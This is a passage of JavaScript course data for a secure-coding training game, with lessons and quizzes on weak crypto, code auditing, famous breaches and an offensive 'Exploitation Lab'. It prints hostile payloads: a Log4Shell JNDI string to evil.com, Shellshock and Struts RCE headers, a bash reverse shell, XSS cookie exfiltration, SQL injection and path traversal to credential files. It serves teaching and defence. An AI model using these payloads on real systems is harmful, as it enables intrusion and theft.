      opts:['It is illegal','It is fast and unsalted, so leaked hashes are cracked quickly','It only works on numbers','It is far too slow'],a:1,
      why:'Password hashing should be <b>slow and salted</b>. MD5/SHA are fast, so a stolen database is brute-forced rapidly. Use bcrypt/argon2/PBKDF2.'}
   ]},
   {id:'cr2', name:'Weak & predictable randomness', xp:30, cards:[
     {t:'md',html:'<p>Security tokens (session ids, password-reset links, API keys) must be <b>unpredictable</b>. Ordinary random functions — <code class="inl">rand()</code>, <code class="inl">mt_rand()</code>, <code class="inl">Math.random()</code>, <code class="inl">java.util.Random</code> — are <i>not</i> cryptographically secure and can be predicted.</p><p>Use a CSPRNG: <code class="inl">random_bytes()</code> (PHP), <code class="inl">crypto.randomBytes()</code> (Node), the <code class="inl">secrets</code> module (Python), <code class="inl">SecureRandom</code> (Java).</p>'},
     {t:'read',lang:'js',label:'Predictable vs secure',code:'const token = Math.random().toString(36);              // predictable!\nconst token = crypto.randomBytes(32).toString("hex");  // secure',note:'<code class="inl">Math.random()</code> is seeded predictably and is not meant for security. A CSPRNG like <code class="inl">crypto.randomBytes</code> produces unguessable tokens.'},
     {t:'quiz',q:'Which is safe for generating a password-reset token?',
      opts:['Math.random()','crypto.randomBytes() / a CSPRNG','The current timestamp','An incrementing counter'],a:1,
      why:'Reset tokens must be unguessable. Non-crypto RNGs, timestamps and counters are predictable; a <b>CSPRNG</b> is required.'}
   ]},
   {id:'cr3', name:'Broken encryption usage', xp:35, cards:[
     {t:'md',html:'<p>Even with a strong cipher (AES), <i>how</i> it is used matters:</p><p>• <b>ECB mode</b> encrypts identical blocks identically — patterns leak (the famous "ECB penguin").<br>• <b>Hardcoded keys/IVs</b> in source mean anyone with the code can decrypt.<br>• <b>Reused IV/nonce</b> breaks the security of stream and GCM modes.</p>'},
     {t:'read',lang:'python',label:'Red flags',code:'cipher = AES.new(key, AES.MODE_ECB)      # ECB: leaks patterns\nkey = b"hardcoded-secret-key-123"          # hardcoded key\niv  = b"0000000000000000"                  # fixed / reused IV',note:'Prefer an authenticated mode (AES-GCM) with a random per-message nonce, and load keys from a secrets manager — never literals in source.'},
     {t:'quiz',q:'Why is AES in <b>ECB mode</b> a weakness?',
      opts:['AES is broken','Identical plaintext blocks produce identical ciphertext, leaking structure','It is too slow','It needs no key'],a:1,
      why:'<b>ECB</b> lacks diffusion between blocks, so repeated plaintext shows as repeated ciphertext. Use an authenticated mode (GCM) with a random nonce.'}
   ]},
   {id:'cr4', name:'Comparing secrets & timing attacks', xp:30, cards:[
     {t:'md',html:'<p>Comparing a secret (token, HMAC, API key) with a normal <code class="inl">==</code> can leak information: many implementations stop at the first differing byte, so the check takes slightly longer the more leading bytes match. Over many requests an attacker can recover the secret — a <b>timing side-channel</b>.</p><p>Use a <b>constant-time</b> comparison instead.</p>'},
     {t:'read',lang:'python',label:'Timing-unsafe vs safe',code:'if token == expected:                       # early-exit, timing leak\n    grant()\nif hmac.compare_digest(token, expected):    # constant-time\n    grant()',note:'Constant-time helpers: <code class="inl">hmac.compare_digest</code> (Python), <code class="inl">hash_equals</code> (PHP), <code class="inl">crypto.timingSafeEqual</code> (Node).'},
     {t:'quiz',q:'Why compare security tokens with a constant-time function?',
      opts:['It is faster','A normal == can leak how many leading bytes matched via timing, helping an attacker recover the secret','== does not work on strings','To save memory'],a:1,
      why:'Byte-by-byte <code class="inl">==</code> exits early on a mismatch, so response time reveals partial matches. <b>Constant-time compare</b> removes that side-channel.'}
   ]},
   {id:'cr5', name:'JWT algorithm confusion', xp:35, cards:[
     {t:'md',html:'<p>A <b>JWT</b>\'s header names the algorithm used to sign it — and trusting that header is the bug. Two classics:</p><p>• <b><code class="inl">alg: none</code></b> — some libraries accept an unsigned token as valid.<br>• <b>RS256 → HS256 confusion</b> — the server expects RSA (verify with the <i>public</i> key), but an attacker sends an <code class="inl">HS256</code> token, and the library verifies it using the public key as the HMAC secret — which the attacker also has. Forged admin tokens follow.</p>'},
     {t:'read',lang:'js',label:'Vulnerable vs safe',code:'// vulnerable: trusts the alg in the attacker-controlled header\njwt.verify(token, key);   // may accept alg:none, or HS256 verified with the public key\n\n// safe: pin the algorithm(s) you accept\njwt.verify(token, key, { algorithms: ["RS256"] });',note:'Always pin the accepted <code class="inl">algorithms</code>. Never let the token\'s own header decide how it is verified — that is how <code class="inl">alg:none</code> and RS256/HS256 confusion forge tokens.'},
     {t:'quiz',q:'How does JWT "algorithm confusion" let an attacker forge a token?',
      opts:['By stealing the private key','The server verifies an attacker-crafted HS256 token using the public key as the HMAC secret (or accepts alg:none)','By brute forcing the password','By XSS'],a:1,
      why:'If the verifier trusts the token\'s <code class="inl">alg</code>, an attacker signs an HS256 token with the known <b>public</b> key and the server accepts it. Pin the expected algorithm to prevent this.'}
   ]}
  ]
 },
 {
  id:'audit', name:'Auditor\'s Eye', tag:'META', icon:'👁', accent:'amber',
  sub:'The cross-language instincts that turn reading into finding.',
  lessons:[
   {id:'a1', name:'The source-to-sink method', xp:30, cards:[
     {t:'md',html:'<p>Every audit is the same loop, in any language:</p><p><b>1. Find sources</b> — where untrusted input enters (params, headers, files, network).<br><b>2. Find sinks</b> — dangerous operations (SQL, shell, HTML, file paths, deserialization).<br><b>3. Trace the path</b> between them.<br><b>4. Check for sanitization</b> on that path. None or weak? Likely a bug.</p><p>You grep for sinks first, then walk <i>backwards</i> to see if input reaches them.</p>'},
     {t:'quiz',q:'Best strategy for auditing a large unfamiliar codebase for injection bugs?',
      opts:['Read every file start to finish','Grep for dangerous sinks, then trace backwards to see if untrusted input reaches them','Only read the comments','Run it and see if it crashes'],a:1,
      why:'Sinks are a short, known list. <b>Grep the sinks, trace backwards to a source</b> — far faster than reading everything, and it centers the actual danger.'}
   ]},
   {id:'a2', name:'Spotting outdated & vulnerable libraries', xp:30, cards:[
     {t:'md',html:'<p>Much real-world risk is not custom code — it is <b>dependencies</b>. Learn to read the manifests:</p><p>• PHP: <code class="inl">composer.json</code> / <code class="inl">composer.lock</code><br>• .NET: <code class="inl">packages.config</code> / <code class="inl">.csproj</code><br>• JS: <code class="inl">package.json</code> / <code class="inl">package-lock.json</code><br>• Python: <code class="inl">requirements.txt</code></p><p>A <b>pinned old version</b> is your lead. Cross-reference it against known CVEs (e.g. the CVE database or GitHub Advisories). Tools like <code class="inl">npm audit</code> and OWASP Dependency-Check automate this.</p>'},
     {t:'read',lang:'js',label:'package.json — a lead',code:'"dependencies": {\n  "lodash": "4.17.4",        // known prototype-pollution CVEs < 4.17.12\n  "express": "4.16.0"\n}',note:'A specific old version is a gift: look it up in an advisory database. Version <code class="inl">4.17.4</code> of lodash predates fixes for several CVEs.'},
     {t:'quiz',q:'You find <code class="inl">"lodash":"4.17.4"</code> pinned in package.json. Best next step?',
      opts:['Assume it is fine','Check that exact version against a CVE / advisory database for known vulnerabilities','Delete package.json','Upgrade blindly without testing'],a:1,
      why:'A pinned version maps directly to published <b>CVEs/advisories</b>. Confirm whether that version is affected and whether the vulnerable code path is actually reachable.'}
   ]},
   {id:'a3', name:'Weak crypto & hardcoded secrets', xp:30, cards:[
     {t:'md',html:'<p>Two findings you can spot by <b>reading</b>, no exploit needed:</p><p><b>Weak crypto</b> — <code class="inl">MD5</code>/<code class="inl">SHA1</code> for passwords, <code class="inl">DES</code>, <code class="inl">ECB</code> mode, <code class="inl">Math.random()</code> for tokens.<br><b>Hardcoded secrets</b> — API keys, passwords, or private keys written straight into source.</p>'},
     {t:'read',lang:'python',label:'Two findings in three lines',code:'API_KEY = "sk_live_51H8xQ2eZ..."      # hardcoded secret\nhashed = hashlib.md5(password).hexdigest()  # MD5 for passwords',note:'Secrets in source leak through repos and backups. MD5 is fast and broken for password hashing — bcrypt/argon2 are the expected choices.'},
     {t:'quiz',q:'Which is a legitimate reading-only finding, no runtime test required?',
      opts:['A hardcoded API key in source combined with MD5 password hashing','A well-named variable','A function with comments','Use of prepared statements'],a:0,
      why:'Both <b>hardcoded secrets</b> and <b>MD5 for passwords</b> are visible statically. They are reliable, high-signal findings you report straight from the code.'}
   ]},
   {id:'a4', name:'Race conditions (TOCTOU)', xp:30, cards:[
     {t:'md',html:'<p>A <b>race condition</b> happens when the result depends on the timing of concurrent operations. The classic form is <b>TOCTOU</b> — time-of-check to time-of-use: code checks a condition, then acts on it, but the state can change in between.</p><p>Example: two requests both read a balance of $100, both pass the "enough funds?" check, and both withdraw — spending $200. The tell is <b>check-then-act</b> on shared state (a balance, a coupon, a file) with no lock or atomic operation.</p>'},
     {t:'read',lang:'python',label:'Check-then-act vs atomic',code:'# vulnerable: a gap between the check and the update\nif account.balance >= amount:      # TIME OF CHECK\n    account.balance -= amount       # TIME OF USE (another request slips in here)\n\n# safer: one atomic, conditional update in the database\n#   UPDATE accounts SET balance = balance - :amt\n#    WHERE id = :id AND balance >= :amt',note:'Concurrent requests can both pass the check before either updates. Fix with atomic DB operations, row locks (<code class="inl">SELECT ... FOR UPDATE</code>), or unique constraints — not a check followed by a separate write.'},
     {t:'quiz',q:'What is the flaw in "check the balance, then subtract it" as two separate steps?',
      opts:['It is too slow','Between the check and the update a concurrent request can also pass the check — a TOCTOU race','Subtraction is imprecise','It uses too much memory'],a:1,
      why:'<b>TOCTOU</b>: the state can change between the check and the use, so two concurrent requests both pass the check and both act. Use an atomic conditional update or a lock.'}
   ]},
   {id:'a5', name:'Grepping for sinks', xp:30, cards:[
     {t:'md',html:'<p>The fastest way into an unfamiliar codebase is not to read all of it — it is to <b>grep for the short list of dangerous sinks</b>, then trace each hit backwards to a source. Tools scale this up: <b>ripgrep</b> for speed, <b>semgrep</b> for language-aware rules, and <b>CodeQL</b> for deep dataflow.</p>'},
     {t:'read',lang:'bash',label:'hunt the sinks',code:'# grep the repo for dangerous sinks, then trace each hit to a source\n$ rg -n "system|exec|shell_exec|child_process"    # shell / RCE\n$ rg -n "query|execute|Sprintf.*SELECT"           # SQL\n$ rg -n "innerHTML|render_template_string|pickle" # HTML / template / deserialize\n\n$ semgrep --config auto .    # language-aware rules with dataflow',note:'Sinks are a short, known list — grep them first, then walk each hit back to see if untrusted input reaches it. <code class="inl">semgrep</code> and CodeQL add dataflow so you get fewer false positives.'},
     {t:'quiz',q:'Which tool adds dataflow analysis to cut false positives when hunting sinks?',
      opts:['plain grep','semgrep / CodeQL','cat','ls'],a:1,
      why:'<b>semgrep</b> and <b>CodeQL</b> understand code structure and trace data from source to sink, so they flag reachable bugs rather than every text match — far fewer false positives than plain grep.'}
   ]}
  ]
 },
 {
  id:'breach', name:'Breach Files', tag:'REAL-WORLD', icon:'🔥', accent:'amber',
  sub:'Real vulnerabilities that hacked real companies — and the code behind them.',
  lessons:[
   {id:'b1', name:'Log4Shell — logging turned into RCE', xp:40, cards:[
     {t:'md',html:'<p><b>Log4Shell</b> (CVE-2021-44228, December 2021) may be the most widespread vulnerability ever. <b>Log4j</b>, a logging library embedded in countless Java apps, evaluated special <code class="inl">${...}</code> lookups <i>inside log messages</i>. One of them, <code class="inl">${jndi:...}</code>, would reach out over the network and load a remote Java class — remote code execution.</p><p>The frightening part: you did not need to attack a login form. If any attacker-controlled string was ever <b>logged</b> — a username, a <code class="inl">User-Agent</code> header, a chat message — the exploit fired.</p>'},
     {t:'read',lang:'java',label:'Java — the innocent-looking trigger',code:'import org.apache.logging.log4j.Logger;\n\nString ua = request.getHeader("User-Agent");\nlogger.info("request from " + ua);   // just logging attacker input...\n// User-Agent: ${jndi:ldap://evil.com/x}  ->  Log4j fetches & runs remote code',note:'Nothing here looks dangerous — it is one log line. The flaw lived <b>inside Log4j</b>, which parsed <code class="inl">${jndi:...}</code> in the message. Lesson: a vulnerable <b>dependency</b> can turn ordinary code into RCE. The fix was upgrading Log4j.'},
     {t:'quiz',q:'Why was Log4Shell so dangerous and so hard to spot in your own code?',
      opts:['It required admin access','Merely logging attacker-controlled text triggered RCE — the bug was in the logging library, not your code','It only affected old Windows','It needed a database'],a:1,
      why:'The vulnerability was in the <b>Log4j dependency</b>\'s handling of <code class="inl">${jndi:}</code> lookups. Any logged attacker input became an exploit — which is why auditing dependencies matters as much as auditing your own code.'}
   ]},
   {id:'b2', name:'Heartbleed — a missing length check', xp:45, cards:[
     {t:'md',html:'<p><b>Heartbleed</b> (CVE-2014-0160, 2014) was a flaw in <b>OpenSSL</b>, the library securing much of the web. The TLS "heartbeat" lets a client send a small payload and asks the server to echo it back, along with a <b>length</b> the client specifies.</p><p>OpenSSL trusted that length without checking it against the actual payload size. Ask it to echo 64KB when you sent 1 byte, and the server returns 64KB of adjacent <b>memory</b> — which could hold passwords, session cookies, or the server\'s private key.</p>'},
     {t:'read',lang:'cpp',label:'C — the bug, simplified',code:'/* attacker controls payload_len, independent of the real data sent */\nunsigned char *buffer = malloc(payload_len);\nmemcpy(buffer, payload, payload_len);   // no check: payload_len may exceed real payload\n/* buffer now holds bytes from past the input -> memory disclosure */',note:'This is an <b>over-read</b>: a missing <i>bounds check</i> on an attacker-supplied length. The fix added one check that <code class="inl">payload_len</code> did not exceed the data actually received. One <code class="inl">if</code> statement.'},
     {t:'quiz',q:'What class of bug was Heartbleed?',
      opts:['SQL injection','A missing bounds check on an attacker-controlled length, causing a memory over-read (disclosure)','A weak password','Cross-site scripting'],a:1,
      why:'Heartbleed trusted a client-supplied <b>length</b> and copied that many bytes regardless of the real payload size — leaking adjacent memory. It is the C/C++ reading skill applied to world-shaking code.'}
   ]},
   {id:'b3', name:'Capital One — SSRF to cloud metadata', xp:45, cards:[
     {t:'md',html:'<p>In 2019, an attacker stole the data of roughly <b>100 million</b> Capital One customers. The entry point was a <b>Server-Side Request Forgery</b> against a misconfigured firewall/proxy.</p><p>The attacker made the server request the AWS <b>metadata endpoint</b> <code class="inl">http://169.254.169.254/</code>, which returns the temporary <b>IAM credentials</b> of the server\'s cloud role. With those keys, they read the company\'s storage buckets.</p>'},
     {t:'read',lang:'python',label:'The pattern that made it possible',code:'# The server could be tricked into fetching an attacker-chosen URL:\n#   http://169.254.169.254/latest/meta-data/iam/security-credentials/\n# which returns temporary AWS keys for the instance role.\nresp = requests.get(user_supplied_url)   # SSRF -> cloud credential theft',note:'This ties two lessons together: an <b>SSRF</b> reaching the cloud <b>metadata</b> service. Modern defenses: enforce IMDSv2, block <code class="inl">169.254.169.254</code>, and allowlist outbound destinations.'},
     {t:'quiz',q:'How did an SSRF turn into a 100-million-record breach at Capital One?',
      opts:['It crashed the server','SSRF reached the cloud metadata endpoint, which returned IAM credentials used to read stored data','It guessed the admin password','It exploited a buffer overflow'],a:1,
      why:'The SSRF fetched <code class="inl">169.254.169.254</code> metadata to steal the instance\'s <b>IAM role credentials</b>, then used them against storage. SSRF + cloud metadata is a critical combination to recognize.'}
   ]},
   {id:'b4', name:'Shellshock — Bash parses env vars', xp:40, cards:[
     {t:'md',html:'<p><b>Shellshock</b> (CVE-2014-6271, 2014) was a flaw in GNU <b>Bash</b>. Bash stored exported functions in environment variables — and kept executing any commands that <i>trailed</i> the function definition. So if attacker-controlled data reached a Bash environment variable, it ran commands.</p><p>The classic vector was <b>CGI</b> web scripts, which copy HTTP headers (like <code class="inl">User-Agent</code>) into environment variables before invoking Bash.</p>'},
     {t:'read',lang:'bash',label:'the magic value',code:'# a function definition followed by a trailing command:\n$ env x=\'() { :; }; echo PWNED\' bash -c "true"\nPWNED\n\n# over HTTP against a vulnerable CGI script:\n#   User-Agent: () { :; }; /bin/cat /etc/passwd',note:'The <code class="inl">() { :; };</code> is an empty function; everything after it ran when Bash imported the variable. Any path that put attacker input into a Bash env var — especially CGI — became RCE. The fix was patching Bash.'},
     {t:'quiz',q:'What did Shellshock abuse?',
      opts:['A SQL query','Bash executing trailing commands after a function definition stored in an environment variable','A weak password','A buffer overflow'],a:1,
      why:'Bash kept running commands appended after an exported function in an environment variable. When attacker input reached such a variable (notably via CGI headers), it executed — remote code execution.'}
   ]},
   {id:'b5', name:'Equifax — Struts & a header', xp:45, cards:[
     {t:'md',html:'<p>The 2017 <b>Equifax</b> breach exposed about <b>147 million</b> people. The entry point was Apache <b>Struts</b> (CVE-2017-5638): Struts mishandled a malformed <code class="inl">Content-Type</code> header and evaluated it as an <b>OGNL</b> expression — an expression language — so a crafted header ran code (RCE). A patch had been available for months but was not applied in time.</p>'},
     {t:'read',lang:'java',label:'a header that runs code',code:'// a malicious Content-Type carrying an OGNL expression:\nContent-Type: %{(#cmd=\'id\').(#p=new java.lang.ProcessBuilder(#cmd))...}\n// Struts evaluated the header -> the command ran on the server',note:'Two lessons at once: a <b>vulnerable dependency</b> (Struts) turned a header into RCE, and an <b>available patch</b> went unapplied. Auditing dependencies and patching promptly matter as much as secure code.'},
     {t:'quiz',q:'How did the Equifax breach begin?',
      opts:['A phishing email','A crafted Content-Type header exploited a known, unpatched Apache Struts RCE (OGNL)','A stolen laptop','A weak admin password'],a:1,
      why:'Attackers sent a malicious <code class="inl">Content-Type</code> header that Struts evaluated as an OGNL expression, achieving RCE. The flaw (CVE-2017-5638) was already patched upstream but not deployed in time.'}
   ]}
  ]
 },
 {
  id:'exploit', name:'Exploitation Lab', tag:'OFFENSIVE', icon:'⚔', accent:'amber',
  sub:'Turn a spotted bug into proof of impact. For authorized testing, CTFs and labs only.',
  lessons:[
   {id:'ex1', name:'SQL injection: extracting data', xp:40, cards:[
     {t:'md',html:'<p><b>For use only on systems you own or are authorized to test.</b> Once you can inject SQL, the next step is proving impact — reading data the app never meant to expose.</p><p>The main techniques:</p><p>• <b>UNION-based</b> — append <code class="inl">UNION SELECT</code> to pull other tables into the results.<br>• <b>Blind boolean</b> — when no data is echoed, ask true/false questions and watch the page change.<br>• <b>Blind time-based</b> — use <code class="inl">SLEEP()</code> so the database pauses when a condition is true.</p>'},
     {t:'read',lang:'sql',label:'UNION-based extraction',code:'-- vulnerable query:  ...WHERE id = [input]\n1 UNION SELECT username, password FROM users -- \n-- the injected row returns credentials alongside the normal result',note:'UNION needs the same column count and compatible types; attackers first find the count with <code class="inl">ORDER BY</code>. Tools like sqlmap automate this — understanding it by hand is the skill. The upstream fix is always parameterized queries.'},
     {t:'quiz',q:'What does appending <code class="inl">UNION SELECT username, password FROM users</code> achieve?',
      opts:['Deletes the users table','Merges attacker-chosen columns from another table into the query results','Logs the attacker in automatically','Nothing'],a:1,
      why:'A <b>UNION</b> injection appends a second result set, letting the attacker read arbitrary columns and tables the query never intended to expose.'}
   ]},
   {id:'ex2', name:'Command injection: getting a shell', xp:40, cards:[
     {t:'md',html:'<p><b>Authorized testing only.</b> When user input reaches a shell, an attacker first proves execution, then upgrades to interactive control.</p><p>• <b>Prove it</b> — chain a harmless command: <code class="inl">; id</code> or <code class="inl">| whoami</code>.<br>• <b>Out-of-band</b> — if output is not shown, trigger a delay or a DNS/HTTP callback (<code class="inl">; sleep 5</code>).<br>• <b>Upgrade</b> — a <b>reverse shell</b> makes the target connect back to a listener the tester controls.</p>'},
     {t:'read',lang:'php',label:'From injection to callback',code:'// sink:  system("ping -c1 " . $host);\n// prove execution:    8.8.8.8; id\n// blind, time-based:   8.8.8.8; sleep 5\n// reverse shell (concept):  host; bash -i >& /dev/tcp/TESTER_IP/PORT 0>&1',note:'The reverse-shell payload makes the server open a connection back to the tester listener, giving interactive execution. Defence: never pass user input to a shell, allowlist arguments, and filter egress. Only ever run against authorized targets.'},
     {t:'quiz',q:'After confirming command injection, what does a <b>reverse shell</b> do?',
      opts:['Encrypts the server','Makes the target connect back to the tester machine for interactive control','Resets the admin password','Deletes the logs'],a:1,
      why:'A reverse shell has the target initiate an outbound connection to the tester listener, giving interactive command execution — the proof-of-impact step in an authorized test. Defence: keep user input out of shells and filter egress.'}
   ]},
   {id:'ex3', name:'XSS: stealing the session', xp:40, cards:[
     {t:'md',html:'<p><b>Authorized testing only.</b> A reflected or stored XSS becomes account takeover when the injected script acts as the victim.</p><p>• <b>Cookie theft</b> — if the session cookie lacks <code class="inl">HttpOnly</code>, script can read <code class="inl">document.cookie</code> and exfiltrate it.<br>• <b>Session riding</b> — even with <code class="inl">HttpOnly</code>, the script can send authenticated requests <i>as the victim</i> (change email, add an admin).<br>• Defences: output encoding, <code class="inl">HttpOnly</code> + <code class="inl">SameSite</code> cookies, and a strong Content-Security-Policy.</p>'},
     {t:'read',lang:'js',label:'Proof-of-impact payloads',code:'// steal a non-HttpOnly cookie:\nnew Image().src = "https://tester.example/c?" + document.cookie;\n// or ride the victim session directly:\nfetch("/account/email", {method:"POST", body:"new=attacker@evil.test"});',note:'The first payload exfiltrates the cookie; the second rides the existing session to change account data. <code class="inl">HttpOnly</code> blocks cookie reads but not session-riding — output encoding and CSP are the real fixes.'},
     {t:'quiz',q:'How does the <code class="inl">HttpOnly</code> cookie flag limit XSS impact?',
      opts:['It blocks all XSS','It stops script reading the cookie via document.cookie (but not session-riding requests)','It encrypts the page','It disables JavaScript'],a:1,
      why:'<b>HttpOnly</b> hides the cookie from JavaScript, stopping direct theft — but injected script can still send authenticated requests as the victim. Fix the XSS itself with output encoding and CSP.'}
   ]},
   {id:'ex4', name:'Blind SQL injection', xp:45, cards:[
     {t:'md',html:'<p><b>Authorized testing only.</b> Sometimes an injectable query returns no visible data and no error — but you can still extract information by <b>inference</b>.</p><p>• <b>Boolean-based</b> — inject a condition and watch whether the response changes between <i>true</i> and <i>false</i>.<br>• <b>Time-based</b> — make the database pause when a condition is true, and measure the response time.</p><p>Ask one yes/no question per request and you can reconstruct data character by character.</p>'},
     {t:'read',lang:'sql',label:'Boolean & time-based probes',code:'-- boolean: does the admin password start with \'a\' ?\n\' AND substring(password,1,1) = \'a\' -- \n-- if the page renders the "true" state, the guess is right; else try \'b\'\n\n-- time-based: delay 5s only when the condition holds\n\' AND IF(substring(password,1,1) = \'a\', SLEEP(5), 0) -- ',note:'Automated tools (sqlmap) do this quickly, but the idea is pure inference — each request answers one true/false question. The upstream fix is always parameterized queries.'},
     {t:'quiz',q:'How does <b>time-based</b> blind SQL injection extract data with nothing shown on the page?',
      opts:['It reads the HTML source','It makes the database delay (SLEEP) when a guessed condition is true, inferring data from response time','It brute-forces the login form','It reads cookies'],a:1,
      why:'With no data echoed, the attacker infers it: a conditional <code class="inl">SLEEP</code> makes the server slow only when a guess is correct, revealing the value one character at a time.'}
   ]},
   {id:'ex5', name:'Deserialization gadget chains', xp:45, cards:[
     {t:'md',html:'<p><b>Authorized testing only.</b> Finding insecure deserialization is step one; <b>exploiting</b> it uses a <b>gadget chain</b> — a sequence of methods in libraries <i>already present</i> in the app that, when a crafted object is deserialized, chain together into something dangerous like running a command.</p><p>You rarely write the chain by hand — public tools generate payloads for known libraries: <b>ysoserial</b> (Java), <b>ysoserial.net</b> (.NET), <b>PHPGGC</b> (PHP).</p>'},
     {t:'read',lang:'java',label:'The concept',code:'// 1. app calls readObject() on attacker bytes   (the vulnerability)\n// 2. those bytes describe an object graph built from library classes\n// 3. as it is rebuilt, method calls chain together, e.g.\n//      Map -> Comparator -> Template -> Runtime.exec("...")   = RCE\n//\n// generate a payload:  java -jar ysoserial.jar CommonsCollections1 "id"',note:'The chain relies on classes on the app\'s classpath, so the fix is upstream: do not deserialize untrusted data, and use type allowlists. Removing the vulnerable library removes the gadgets.'},
     {t:'quiz',q:'What is a "gadget chain" in deserialization exploitation?',
      opts:['A hardware device','A sequence of methods in existing app/library classes that a crafted object triggers on deserialization to reach code execution','A kind of firewall','A password wordlist'],a:1,
      why:'A <b>gadget chain</b> strings together methods in classes already on the classpath so deserializing a crafted object reaches a dangerous call. Tools like <b>ysoserial</b> build these payloads; the defence is to never deserialize untrusted data.'}
   ]},
   {id:'ex6', name:'Buffer overflow 101', xp:45, cards:[
     {t:'md',html:'<p><b>Lab / authorized use only.</b> A stack buffer overflow can hijack execution. When a function runs, its local buffer and the <b>saved return address</b> sit together on the stack. Writing past the buffer overwrites that return address — control it, and when the function returns the CPU jumps wherever the attacker chose.</p><p>Modern defences raise the bar: <b>stack canaries</b> detect overwrites, <b>ASLR</b> randomizes addresses, and <b>NX/DEP</b> stops code running from the stack — so real exploits use techniques like <b>ROP</b>.</p>'},
     {t:'read',lang:'cpp',label:'the classic primitive',code:'void vuln(char *input) {\n    char buf[64];          // 64-byte buffer on the stack\n    strcpy(buf, input);    // > 64 bytes overflows into the saved return address\n}\n// overwrite the return address -> redirect execution when vuln() returns',note:'Overflow a stack buffer to overwrite the return address. Canaries, ASLR and NX/DEP make this harder; exploitation adapts with ROP and info leaks. For labs and authorized testing only.'},
     {t:'quiz',q:'In a classic stack buffer overflow, what does overwriting the saved return address achieve?',
      opts:['It speeds up the program','It redirects the CPU to attacker-chosen code when the function returns','It frees memory','It encrypts the stack'],a:1,
      why:'The saved return address decides where execution resumes after the function. Overwriting it with a controlled value redirects the CPU — the basis of stack-overflow exploitation.'}
   ]},
   {id:'ex7', name:'Path traversal to impact', xp:40, cards:[
     {t:'md',html:'<p><b>Authorized testing only.</b> A path-traversal read (<code class="inl">../</code>) is proven by pulling a known file, then escalated. Read <code class="inl">/etc/passwd</code>, app config, source, or cloud credentials; reading secrets (DB passwords, API keys) often leads straight to bigger access. In some stacks a <b>write</b> traversal plus <b>log poisoning</b> turns file read into RCE.</p>'},
     {t:'read',lang:'bash',label:'proof & escalation',code:'# read a known file to prove the traversal:\n?file=../../../../etc/passwd\n?file=../../app/config/database.yml      # DB credentials\n?file=../../../../proc/self/environ      # env vars / secrets\n# escalate: write into a web-executable path, or poison a log then include it',note:'Proof of impact = retrieving a sensitive file (credentials, source, cloud metadata). The fix is confining paths to a base directory and rejecting <code class="inl">..</code>. Authorized targets only.'},
     {t:'quiz',q:'What is a reliable way to prove a path-traversal vulnerability?',
      opts:['Refresh the page','Retrieve a known sensitive file (e.g. /etc/passwd) using ../ sequences','Change the password','Clear the cache'],a:1,
      why:'Pulling a known file such as <code class="inl">/etc/passwd</code> or a config file with credentials demonstrates real impact. Confine paths to a base directory and reject <code class="inl">..</code> to fix it.'}
   ]}
  ]
 }
];
